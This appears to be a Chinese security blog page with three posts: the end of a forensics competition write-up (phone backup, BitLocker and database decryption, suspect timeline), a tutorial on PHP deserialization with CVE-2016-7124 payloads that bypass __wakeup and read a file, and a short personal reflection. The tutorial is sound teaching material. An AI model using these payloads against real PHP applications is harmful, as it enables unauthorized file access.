<h4 id="2-手机备份分析"><a href="#2-手机备份分析" class="headerlink" title="2.手机备份分析"></a>2.手机备份分析</h4><p>使用火眼介质分析发现内容如下:<br>IOS备份，虚拟机记录Ubuntu，Xshell连接密钥<br> <img src="/2021/03/24/changAnCup/49.png"><br>通过仿真启动检材4镜像，在桌面看到如下内容：<br>Xshell直接运行起来发现其中有两个连接记录，通过密钥的方式进行的连接，密钥文件为packerlin’s test（Xshell的缓存）<br><img src="/2021/03/24/changAnCup/50.png"><br>同时桌面还有一个便签内容为‘niuroumian6’，一个新建文本文档，打开之后看起来像一个密码字典，<br><img src="/2021/03/24/changAnCup/51.png"><br>使用火眼添加手机备份文件为证据直接进行分析，发现该手机备份为加密备份，尝试发现的各种密码，‘niuroumian6’成功解开备份，可以直接对手机备份进行分析，手机内的短信、微信、qq中均发现案件相关聊天记录，通过聊天记录基本可以梳理出来整个案发的流程，同时通过短信了解到该嫌疑人还使用钓鱼网站对一名受害者进行诈骗：<br><img src="/2021/03/24/changAnCup/52.png"><br>通过对检材4分析，发现前面的虚拟机有嫌疑，因此导出虚拟机查看<br> <img src="/2021/03/24/changAnCup/53.png"></p>
<h4 id="3-网站重构"><a href="#3-网站重构" class="headerlink" title="3.网站重构"></a>3.网站重构</h4><p>在前面检材分析过程中，发现mongo服务器的数据库被drop掉，数据库中无内容，结合后面聊天记录了解到，在检材2的root目录下存在一个被加密的db，应该是嫌疑人要对目标进行勒索，因此下载了加密软件进行了加密<br><img src="/2021/03/24/changAnCup/60.png"><br>方法1：可以尝试使用逆向工程的方法对encrypt（5）文件进行分析，查看大致的加密方式，从而尝试破解或者解密。使用IDA对ELF文件进行逆向分析，可以通过代码或者流图大致看出该加密方式为逐字节+66（10进制），然后和AA进行异或，由于加密方式很简单可以通过WINHEX或者编写简单脚本即可实现解密。<br><img src="/2021/03/24/changAnCup/61.png"><br><img src="/2021/03/24/changAnCup/62.png"><br>方法2：<br>在windows检材中，C盘根目录发现了一个VHD的文件，<br><img src="/2021/03/24/changAnCup/63.png"><br> 双击直接运行，win10系统会自动挂载，发现该分区为bitloker加密分区，通过时间线分析（详见下文），发现该检材又发出过邮件，但是本机未分析出来，通过前面的流量包考虑到，该设备的流程应该都被检材3监听下来，因此尝试对数据包进行分析，发现了一份邮件发出的数据包，追踪TCP流将邮件提取出，发现了备份的bitlocker密钥，但是压缩包加过密码，因此需要尝试破解，联想到之前发现的密码线索桌面字典和便签，尝试对该压缩包进行字典破解，成功破解出密码  !VCHWEDfdfd2IOA564356:”:”  ，<br><img src="/2021/03/24/changAnCup/64.png"><br><img src="/2021/03/24/changAnCup/65.png"><br><img src="/2021/03/24/changAnCup/66.png"><br>成功解压后，可以对加密分区进行解密，该分区内发现了3个与案件相关的重要文件，结合时间线，db文件为嫌疑人拖库的mongo数据，decrypt为解密程序，we.tar.gz为嫌疑人下载的网站代码，因此直接使用db，或者上传decrypt（解压密码为便签内容）到检材1、2，对其中加密的文件进行解密<br> <img src="/2021/03/24/changAnCup/67.png"></p>
<p>通过上述两种方法，我们可以找到正常的数据库备份文件db，因此导回检材2的mongo数据库中，可以尝试重启网站：<br><img src="/2021/03/24/changAnCup/68.png"><br>由于检材在本地仿真的时候IP发生了变化，因此要调整配置文件的内容，对检材1中的nginx配置文件和数据库配置文件进行修改，此处修改要根据自己虚拟机网络配置的情况进行修改，修改好配置之后，将docker中的run.sh脚本复制到网站目录执行后可以启动网站。<br><img src="/2021/03/24/changAnCup/69.png"><br><img src="/2021/03/24/changAnCup/70.png"><br><img src="/2021/03/24/changAnCup/71.png"><br>查看检材1中网站配置文件/server/index.js，发现该文件引用了api.js，查看该文件发现其中关键的验证登录的字段，直接使用数据库种明文密码登陆，因此登陆数据库查看user表，使用表中用户登陆网站，成功登陆进去<br><img src="/2021/03/24/changAnCup/72.png"><br><img src="/2021/03/24/changAnCup/73.png"><br><img src="/2021/03/24/changAnCup/74.png"></p>
<h3 id="案情时间线梳理"><a href="#案情时间线梳理" class="headerlink" title="案情时间线梳理"></a>案情时间线梳理</h3><p>16:17分找到权限并尝试登陆页面<br><img src="/2021/03/24/changAnCup/80.png"><br>16:19:54下载密钥文件<br><img src="/2021/03/24/changAnCup/81.png"><br>16:20:42 运行xshell<br><img src="/2021/03/24/changAnCup/82.png"><br>16:21:18 设置用户密钥<br><img src="/2021/03/24/changAnCup/83.png"><br>16:21:28 成功连接128服务器<br><img src="/2021/03/24/changAnCup/84.png"><br>16:31:06 初次启动xftp，创建文件夹及文件<br><img src="/2021/03/24/changAnCup/85.png"><br>16;33:00传输web文件，16:33:15传输完成<br><img src="/2021/03/24/changAnCup/86.png"><br><img src="/2021/03/24/changAnCup/87.png"></p>
<p>16:34:55 登陆网页微信<br><img src="/2021/03/24/changAnCup/88.png"><br>16:40:13 打开rar，解压web文件<br><img src="/2021/03/24/changAnCup/89.png"><br>16:44:03查看关键数据库链接文件<br><img src="/2021/03/24/changAnCup/90.png"><br>16:45:45——数据库连接<br><img src="/2021/03/24/changAnCup/91.png"><br>16:53:45——17:12:30 手机QQ/微信购买ddos<br><img src="/2021/03/24/changAnCup/92.png"><br>17:15:33 下载runit（DDOS）<br><img src="/2021/03/24/changAnCup/93.png"><br>17:18:20新建xshell连接，17:18:55连接成功<br><img src="/2021/03/24/changAnCup/94.png"><br>17:22:23 下载db<br><img src="/2021/03/24/changAnCup/95.png"><br><img src="/2021/03/24/changAnCup/96.png"><br>17:27:53——17:37:56 手机QQ/微信购买加密解密<br><img src="/2021/03/24/changAnCup/97.png"><br>17:39:32 下载解密程序<br><img src="/2021/03/24/changAnCup/98.png"><br>17:42:20 再次访问129服务器<br><img src="/2021/03/24/changAnCup/99.png"><br>17:44:35 再次连接128服务器<br><img src="/2021/03/24/changAnCup/100.png"><br>17:45:16 XFTP连接128服务器<br><img src="/2021/03/24/changAnCup/101.png"><br><img src="/2021/03/24/changAnCup/102.png"><br>17:49:01 bitlocker加密<br><img src="/2021/03/24/changAnCup/103.png"><br>17:49:45 密钥生成于C:\users<br><img src="/2021/03/24/changAnCup/104.png"><br>17:51:47 桌面出现txt<br><img src="/2021/03/24/changAnCup/105.png"><br>17:52:19 目录下出现BitLocker.rar<br><img src="/2021/03/24/changAnCup/106.png"><br>17:53:24 运行foxmail<br><img src="/2021/03/24/changAnCup/107.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p>1.<a target="_blank" rel="noopener" href="https://xdforensics-wiki.github.io/XDforensics-wiki/linux2/#docker">https://xdforensics-wiki.github.io/XDforensics-wiki/linux2/#docker</a><br>1、<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/806485990aea">https://www.jianshu.com/p/806485990aea</a> Docker文件目录 - 简书<br>2、<a target="_blank" rel="noopener" href="https://hub.docker.com/_/mysql">https://hub.docker.com/_/mysql</a> mysql - Docker Hub<br>3、李鹏超, 周凯. 基于Docker容器的电子数据取证方法[J]. 吉林大学学报(理学版), 2019, 57(06): 1485-1490.</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/24/php-unserialize/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/24/php-unserialize/" class="post-title-link" itemprop="url">PHP反序列化原理及CVE-2016-7124案例</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-24 15:48:16" itemprop="dateCreated datePublished" datetime="2021-03-24T15:48:16+08:00">2021-03-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-28 15:34:16" itemprop="dateModified" datetime="2021-03-28T15:34:16+08:00">2021-03-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x01-原理解释"><a href="#0x01-原理解释" class="headerlink" title="0x01 原理解释"></a>0x01 原理解释</h2><blockquote>
<p><strong>PHP的反序列化漏洞</strong>其实是PHP对象的属性篡改漏洞。漏洞的成因在于代码中unserialize的参数不可控。导致服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进魔术方法里面执行以实现攻击. </p>
</blockquote>
<blockquote>
<p>PHP unserialization vulnerability is actually a PHP object property tamper vulnerability.The cause of the vulnerability is that the parameters of unserialize in the code are not controllable.The server was able to receive the deserialized string and unfiltered its variables directly into the magic method to execute the attack.**PHP deserialization vulnerability ** is actually a PHP object property tamper vulnerability.The cause of the vulnerability is that the parameters of unserialize in the code are not controllable.The server was able to receive the deserialized string and unfiltered its variables directly into the magic method to execute the attack.</p>
</blockquote>
<h3 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h3><ol>
<li>php源码同python一样是由c所写</li>
<li>可以序列化的对象都可以反序列化</li>
<li>序列化只序列化对象的属性，不序列化方法</li>
<li>序列化后包括，类为object,类长度为4，名为test,包含3个属性：<br>第一个属性为string,长度为10，名为testflag;值长度为6，名为active；因为<strong>prvate</strong>,故而序列化后，原名test被更改<br>第二个同上; 因为<strong>protected</strong>，故而序列化后,原名前加*<br>第三个同上; 因为<strong>public</strong>，故而序列化后,原名不变<br><img src="/2021/03/24/php-unserialize/1.jpg"><br>private序列化后格式：%00类名%00属性名<br><img src="/2021/03/24/php-unserialize/2.png"><br>protected序列化后格式：%00*%00<br><img src="/2021/03/24/php-unserialize/3.png"></li>
</ol>
<h3 id="2-魔术方法"><a href="#2-魔术方法" class="headerlink" title="2. 魔术方法"></a>2. 魔术方法</h3><p>魔术方法(Magic methods)：以两个下划线__开头，包括：<br>(1)__construct()，类的构造函数，当对象创建时会自动调用(但在unserialize()时是不会自动调用的)<br>(2)__sleep()，执行serialize()时，先会调用这个函数<br>(3)__wakeup()，unserialize()时，先会调用这个函数<br>(4)__destruct()，类的析构函数，当对象被销毁时会自动调用<br>(5)__toString()，类被当成字符串时的回应方法。当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用<br>(6)__get()，获得一个类的成员变量时调用。当从不可访问的属性读取数据<br>(7)__call()，在对象中调用一个不可访问方法时调用<br>(8)__callStatic()，用静态方式中调用一个不可访问方法时调用<br>(9)__set()，设置一个类的成员变量时调用</p>
<hr>
<p>其中，__toString()触发条件较多，包括以下：</p>
<p>(1)echo ($obj) / print($obj) 打印时会触发</p>
<p>(2)反序列化对象与字符串连接时</p>
<p>(3)反序列化对象参与格式化字符串时</p>
<p>(4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</p>
<p>(5)反序列化对象参与格式化SQL语句，绑定参数时</p>
<p>(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</p>
<p>(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用</p>
<p>(8)反序列化的对象作为 class_exists() 的参数的时候</p>
<h3 id="3-序列化与反序列化"><a href="#3-序列化与反序列化" class="headerlink" title="3. 序列化与反序列化"></a>3. 序列化与反序列化</h3><p>序列化$data并输出到serialize.txt文件中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test &#123;</span><br><span class="line">    private $flag &#x3D; &#39;Inactive&#39;;</span><br><span class="line">    protected $test &#x3D; &#39;test&#39;;</span><br><span class="line">    public $test1 &#x3D; &#39;test1&#39;;</span><br><span class="line"></span><br><span class="line">    public function set_flag($flag)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;flag &#x3D; $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    public function get_flag($flag)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object &#x3D; new test();</span><br><span class="line">$object-&gt;set_flag(&#39;active&#39;);</span><br><span class="line">$data &#x3D; serialize($object);</span><br><span class="line">file_put_contents(&quot;serialize.txt&quot;,$data);</span><br><span class="line">echo $data;</span><br></pre></td></tr></table></figure>
<p>反序列化serialize.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">    private $flag &#x3D; &#39;Inactive&#39;;</span><br><span class="line">    protected $test &#x3D; &quot;test&quot;;</span><br><span class="line">    public $test1 &#x3D; &quot;test1&quot;;</span><br><span class="line">    public function set_flag($flag)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;flag &#x3D; $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function get_flag()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; file_get_contents(&quot;serialize.txt&quot;);</span><br><span class="line">$data &#x3D; unserialize($data);</span><br><span class="line">echo $data-&gt;test1.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $data-&gt;get_flag(); &#x2F;&#x2F; correspond to serialize.php</span><br></pre></td></tr></table></figure>
<p>魔术方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class swanQ</span><br><span class="line">&#123;</span><br><span class="line">    private $name &#x3D; &#39;swanQ&#39;;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__construct&quot;;</span><br><span class="line">        echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __sleep()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__sleep&quot;;</span><br><span class="line">        echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">        return array(&#39;name&#39;); &#x2F;&#x2F;**</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__wakeup&quot;;</span><br><span class="line">        echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__destruct&quot;;</span><br><span class="line">        echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        return &quot;__toString&quot;.&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$object &#x3D; new swanQ();</span><br><span class="line"></span><br><span class="line">$data &#x3D; serialize($object);</span><br><span class="line">$object1 &#x3D; unserialize($data);</span><br><span class="line">print $object1;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/24/php-unserialize/4.png"><br>新建一个对象时，会自动调用__construct()方法,<br>执行serialize前，会先调用共__sleep()方法<br>执行unserialize前，会先调用__wakeup()方法<br>__destruct()了两次说明，当前有两个对象，一个是将类实例化为对象的时候产生的，一个是反序列化后生成的对象。</p>
<h3 id="4-攻击示例"><a href="#4-攻击示例" class="headerlink" title="4.攻击示例"></a>4.攻击示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;flag is in ctf.php</span><br><span class="line">class Shield&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    function __construct($filename &#x3D; &#39;&#39;)&#123;</span><br><span class="line">        $this-&gt;file &#x3D; $filename;</span><br><span class="line">    &#125;</span><br><span class="line">    function readfile()&#123;</span><br><span class="line">        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;) &#x3D;&#x3D;&#x3D; FALSE</span><br><span class="line">        &amp;&amp; stripos($this-&gt;file,&#39;&#x2F;&#39;) &#x3D;&#x3D;&#x3D; FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)&#x3D;&#x3D;&#x3D;FALSE)&#123;</span><br><span class="line">            return @file_get_contents($this-&gt;file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>shield.php,类中存在属性$file,且file会调用__construct方法。所以我们利用file即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once (&#39;shield.php&#39;);</span><br><span class="line">$x &#x3D; new Shield();</span><br><span class="line">isset($_GET[&#39;class&#39;]) &amp;&amp; $g &#x3D; $_GET[&#39;class&#39;];</span><br><span class="line">if (!empty($g))&#123;</span><br><span class="line">    $x &#x3D; unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line">echo $x-&gt;readfile();</span><br></pre></td></tr></table></figure>
<p>包含shield.php,new实例时会调用__construct()方法，然后接收用户的反序列化并输出。<br>payload:直接构造序列化对象作为file的内容，O:6:”Shield”:1{s:4:”file”;s:8:”ctf.php”;}</p>
<h2 id="0x02-CVE-2016-7124：php绕过-wakeup"><a href="#0x02-CVE-2016-7124：php绕过-wakeup" class="headerlink" title="0x02 CVE-2016-7124：php绕过__wakeup"></a>0x02 CVE-2016-7124：php绕过__wakeup</h2><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h3><p>执行unserialize前，会先调用__wakeup()方法, 但是当序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行。</p>
<h3 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h3><ul>
<li>漏洞影响版本：<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</li>
<li>编写测试脚本：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class t&#123;</span><br><span class="line">    public $sex &#x3D; &#39;swanQ&#39;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;sex &#x3D; &#39;Circ1e&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">$cla &#x3D; new t();</span><br><span class="line">$res &#x3D; serialize($cla); &#x2F;&#x2F;O:4:&quot;test&quot;:1:&#123;s:3:&quot;sex&quot;;s:3:&quot;Circ1e&quot;;&#125;</span><br><span class="line">echo $res;</span><br></pre></td></tr></table></figure>
当__wakeup()被调用时，swanQ变成circ1e.<br>构造payload将传入的序列化数据的对象变量个数由1加至2，绕过__wakeup方法执行。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:3:&quot;sex&quot;;s:3:&quot;Circ1e&quot;;&#125;</span><br><span class="line">O:4:&quot;test&quot;:2:&#123;s:3:&quot;sex&quot;;s:3:&quot;Circ1e&quot;;&#125;</span><br></pre></td></tr></table></figure>
具体复现各位看官自己尝试</li>
</ul>
<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p>[1]深入理解PHP反序列化漏洞:<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a><br>[2]CVE-2016-7124——php绕过__wakeup():<a target="_blank" rel="noopener" href="http://www.cl4y.top/521/">http://www.cl4y.top/521/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/23/think/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/23/think/" class="post-title-link" itemprop="url">夜思</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-23 22:48:16" itemprop="dateCreated datePublished" datetime="2021-03-23T22:48:16+08:00">2021-03-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-24 19:50:07" itemprop="dateModified" datetime="2021-03-24T19:50:07+08:00">2021-03-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%80%9D%E6%83%B3%E7%94%9F%E6%B4%BB/" itemprop="url" rel="index"><span itemprop="name">思想生活</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>初学网络安全是因为对于此专业的兴趣</p>
<p>抑或是对于白帽子的向往</p>
<p>但随着现在心态的成熟，看着周围越来越多同是网络空间安全专业的同学走上了开发的道路，真正搞安全的寥寥无几</p>
<p>内心五味杂陈</p>
<p>或许他们有了自己更加热爱的目标吧</p>
<p>但就现在的我而言，就我最近接触到的各位圈内的师傅们而言</p>
<p>尤其是在受了了八佰这部电影的启迪之后的我而言</p>
<p>我内心真实的想法是，我想要不断不断地提高自己的专业素养和专业技能，我想要为我们国家的网络安全事业奉献出属于自己的力量</p>
<p>每当挣扎在现实当中的时候，我相信前方一定有同伴在等着我，一起走在保家卫国的道路上</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="swanQ"
      src="/images/author.jpg">
  <p class="site-author-name" itemprop="name">swanQ</p>
  <div class="site-description" itemprop="description">Try & Enjoy</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">8</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
    聊天
  </a>
  </div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/swanQs" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;swanQs" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:zhuoma.swanq@foxmail.com" title="E-Mail → mailto:zhuoma.swanq@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">swanQ</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
